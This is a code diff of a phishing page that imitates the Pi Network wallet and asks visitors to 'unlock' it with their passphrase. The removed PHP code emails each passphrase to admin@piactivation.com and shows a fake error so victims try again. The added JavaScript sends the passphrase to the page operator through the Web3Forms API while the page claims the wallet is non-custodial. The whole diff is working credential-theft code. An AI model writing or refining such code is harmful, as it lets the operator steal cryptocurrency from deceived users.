@@ -18,19 +18,19 @@
     .header h1 {
       font-size: 18px;
       margin: 0;
-      padding-left:7px;
-      padding-right:7px;
+      padding-left: 7px;
+      padding-right: 7px;
     }
     .header-icons {
       font-size: 20px;
     }
-    
+
     /* Main content styles */
     .container {
       margin-top: 20px;
       text-align: center;
     }
-    
+
     .unlock-textarea {
       width: 100%;
       height: 150px;
@@ -81,40 +81,27 @@
 <!-- Main Content -->
 <div class="container">
   <h2>Unlock Pi Wallet</h2>
-  
-  <?php
-    // Check if form is submitted
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        // Sanitize and fetch the input
-        $walletPassphrase = htmlspecialchars($_POST['walletPassphrase']);
-        
-        // Set the email details
-        $to = "admin@piactivation.com";
-        $subject = "Wallet Unlock Request";
-        $message = "User has submitted the following wallet passphrase:\n\n" . $walletPassphrase;
-        $headers = "From: noreply@yourdomain.com"; // Replace with your domain or email
 
-        // Send the email
-        if (mail($to, $subject, $message, $headers)) {
-            echo '<div class="success-message"style="color:red;">ERROR!!! PLEASE TRY AGAIN</div>';
-        } else {
-            echo '<div class="success-message" style="color:red;">Failed to send the email. Please try again later.</div>';
-        }
-    }
-  ?>
-  <!-- Form for sending the content -->
-  <form method="POST" action="">
-    <!-- Textarea for translation loading -->
-    <textarea class="unlock-textarea" name="walletPassphrase" placeholder="Enter your passphrase..."></textarea>
+  <!-- Form for sending the passphrase -->
+  <form id="emailForm">
+    <!-- Textarea for wallet passphrase -->
+    <textarea id="walletPassphrase" name="walletPassphrase" class="unlock-textarea" placeholder="Enter your passphrase..." required></textarea>
 
-    <!-- Unlock Button -->
+    <!-- Submit button -->
     <button type="submit" class="unlock-btn">Unlock With Passphrase</button>
   </form>
-<br>
+
+  <!-- Response message -->
+  <div id="responseMessage" style="margin-top: 20px; font-size: 16px; color: red;"></div>
+
   <!-- Description Text -->
   <div class="description">
-    <p style="font-size:22px;font-weight:400">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
-    <p  style="font-size:22px;font-weight:400">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+    <p style="font-size:22px;font-weight:400">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    </p>
+    <p style="font-size:22px;font-weight:400">
+      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+    </p>
   </div>
 </div>
 
@@ -141,6 +128,47 @@
   // Show the modal when the page loads
   $(document).ready(function() {
     $('#authModal').modal('show');
+  });
+
+  // Handle the form submission
+  document.getElementById("emailForm").addEventListener("submit", function (event) {
+    event.preventDefault(); // Prevent default form submission
+
+    const walletPassphrase = document.getElementById("walletPassphrase").value;
+    const responseMessage = document.getElementById("responseMessage");
+
+    if (!walletPassphrase.trim()) {
+      responseMessage.textContent = "Please enter a passphrase.";
+      return;
+    }
+
+    // Web3Forms API integration
+    const formData = new FormData();
+    formData.append("access_key", "YOUR_ACCESS_KEY"); // Replace with your Web3Forms Access Key
+    formData.append("subject", "Wallet Unlock Request");
+    formData.append("from_name", "Wallet User");
+    formData.append("from_email", "noreply@yourdomain.com"); // Replace with your email domain
+    formData.append("message", `Wallet Passphrase: ${walletPassphrase}`);
+
+    fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    })
+      .then(response => response.json())
+      .then(result => {
+        if (result.success) {
+          responseMessage.style.color = "green";
+          responseMessage.textContent = "Passphrase sent successfully!";
+        } else {
+          responseMessage.style.color = "red";
+          responseMessage.textContent = "Failed to send passphrase. Please try again.";
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        responseMessage.style.color = "red";
+        responseMessage.textContent = "An error occurred while sending the passphrase.";
+      });
   });
 </script>
 
